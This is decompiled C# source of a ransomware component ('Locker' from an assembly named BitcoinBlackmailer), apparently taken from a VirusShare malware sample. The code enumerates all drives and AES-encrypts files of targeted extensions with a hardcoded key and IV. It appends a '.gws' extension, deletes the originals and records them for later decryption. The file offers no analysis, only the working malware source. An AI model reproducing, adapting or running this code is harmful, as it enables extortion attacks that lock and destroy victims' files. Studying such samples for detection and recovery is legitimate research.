// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1C352919-BC83-4243-9569-62DB63EC5DCB
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-a375201f22b6e71d8ea0f81266242e4638e1754aeee14059e9c5e39026d6c710.exe

using Main.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath = Path.Combine(Config.WorkFolderPath, "EncryptedFileList.txt");
    private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();
    private const string EncryptionFileExtension = ".gws";
    private const string EncryptionPassword = "OoIsL3eF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      HashSet<string> extensionsToEncrypt = new HashSet<string>(Locker.GetExtensionsToEncrypt());
      foreach (string dirPath in ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Select<DriveInfo, string>((Func<DriveInfo, string>) (drive => drive.RootDirectory.FullName)))
        Locker.EncryptFiles(dirPath, ".gws", extensionsToEncrypt);
      if (File.Exists(Locker.EncryptedFileListPath))
        return;
      string[] array = Locker.EncryptedFiles.ToArray<string>();
      File.WriteAllLines(Locker.EncryptedFileListPath, array);
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      HashSet<string> encryptedFiles = new HashSet<string>();
      if (File.Exists(Locker.EncryptedFileListPath))
      {
        foreach (string readAllLine in File.ReadAllLines(Locker.EncryptedFileListPath))
          encryptedFiles.Add(readAllLine);
      }
      return encryptedFiles;
    }

    private static string CreateFileSystemSimulation()
    {
      string systemSimulation = Path.Combine(Config.WorkFolderPath, "FileSystemSimulation");
      if (!Directory.Exists(systemSimulation))
        Directory.CreateDirectory(systemSimulation);
      using (TextWriter textWriter = (TextWriter) new StreamWriter(Path.Combine(systemSimulation, "TxtTest.txt"), true))
        textWriter.WriteLine("I am a txt test.");
      using (TextWriter textWriter = (TextWriter) new StreamWriter(Path.Combine(systemSimulation, "NotTxtTest.nottxt"), true))
        textWriter.WriteLine("I am NOT a txt test.");
      return systemSimulation;
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      HashSet<string> extensionsToEncrypt1 = new HashSet<string>();
      string extensionsToEncrypt2 = Resources.ExtensionsToEncrypt;
      string[] separator = new string[2]
      {
        Environment.NewLine,
        " "
      };
      foreach (string str in ((IEnumerable<string>) extensionsToEncrypt2.Split(separator, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
        extensionsToEncrypt1.Add(str.Trim());
      extensionsToEncrypt1.Remove(".gws");
      return (IEnumerable<string>) extensionsToEncrypt1;
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      Queue<string> queue = new Queue<string>();
      queue.Enqueue(path);
      while (queue.Count > 0)
      {
        path = queue.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
            queue.Enqueue(directory);
        }
        catch (Exception ex)
        {
          Console.Error.WriteLine((object) ex);
        }
        string[] strArray1 = (string[]) null;
        try
        {
          strArray1 = Directory.GetFiles(path);
        }
        catch (Exception ex)
        {
          Console.Error.WriteLine((object) ex);
        }
        if (strArray1 != null)
        {
          string[] strArray = strArray1;
          for (int index = 0; index < strArray.Length; ++index)
            yield return strArray[index];
          strArray = (string[]) null;
        }
      }
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      foreach (string path in Locker.GetFiles(dirPath).SelectMany((Func<string, IEnumerable<string>>) (file => (IEnumerable<string>) extensionsToEncrypt), (file, ext) => new
      {
        file = file,
        ext = ext
      }).Where(_param1 => _param1.file.EndsWith(_param1.ext)).Select(_param1 => _param1.file).Select(file => new
      {
        file = file,
        fi = new FileInfo(file)
      }).Where(t => t.fi.Length < 10000000L).Select(t => t.file))
      {
        try
        {
          if (Locker.EncryptFile(path, encryptionExtension))
            Locker.EncryptedFiles.Add(path);
        }
        catch
        {
        }
      }
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      foreach (string encryptedFile in Locker.GetEncryptedFiles())
      {
        try
        {
          string path = encryptedFile + encryptionExtension;
          Locker.DecryptFile(path, encryptionExtension);
          File.Delete(path);
        }
        catch
        {
        }
      }
      File.Delete(Locker.EncryptedFileListPath);
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (Config.StartMode != Config.StartModeType.Debug && (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
          return false;
        using (AesCryptoServiceProvider alg = new AesCryptoServiceProvider())
        {
          alg.Key = Convert.FromBase64String("OoIsL3eF23cICQoLDA0ODe==");
          alg.IV = new byte[16]
          {
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 3,
            (byte) 5,
            (byte) 3,
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 0,
            (byte) 2,
            (byte) 0,
            (byte) 6,
            (byte) 7,
            (byte) 6,
            (byte) 0
          };
          Locker.EncryptFile((SymmetricAlgorithm) alg, path, path + encryptionExtension);
        }
      }
      catch
      {
        return false;
      }
      try
      {
        File.Delete(path);
      }
      catch (Exception ex)
      {
        return false;
      }
      return true;
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (!path.EndsWith(encryptionExtension))
          return;
        string outputFile = path.Remove(path.Length - 4);
        using (AesCryptoServiceProvider alg = new AesCryptoServiceProvider())
        {
          alg.Key = Convert.FromBase64String("OoIsL3eF23cICQoLDA0ODe==");
          alg.IV = new byte[16]
          {
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 3,
            (byte) 5,
            (byte) 3,
            (byte) 0,
            (byte) 1,
            (byte) 0,
            (byte) 0,
            (byte) 2,
            (byte) 0,
            (byte) 6,
            (byte) 7,
            (byte) 6,
            (byte) 0
          };
          Locker.DecryptFile((SymmetricAlgorithm) alg, path, outputFile);
        }
      }
      catch
      {
        return;
      }
      try
      {
        File.Delete(path);
      }
      catch (Exception ex)
      {
      }
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] buffer = new byte[65536];
      using (FileStream fileStream1 = new FileStream(inputFile, FileMode.Open))
      {
        using (FileStream fileStream2 = new FileStream(outputFile, FileMode.Create))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, alg.CreateEncryptor(), CryptoStreamMode.Write))
          {
            int count;
            do
            {
              count = fileStream1.Read(buffer, 0, buffer.Length);
              if (count != 0)
                cryptoStream.Write(buffer, 0, count);
            }
            while (count != 0);
          }
        }
      }
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] buffer = new byte[65536];
      using (FileStream fileStream1 = new FileStream(inputFile, FileMode.Open))
      {
        using (FileStream fileStream2 = new FileStream(outputFile, FileMode.Create))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, alg.CreateDecryptor(), CryptoStreamMode.Write))
          {
            int count;
            do
            {
              count = fileStream1.Read(buffer, 0, buffer.Length);
              if (count != 0)
                cryptoStream.Write(buffer, 0, count);
            }
            while (count != 0);
          }
        }
      }
    }
  }
}
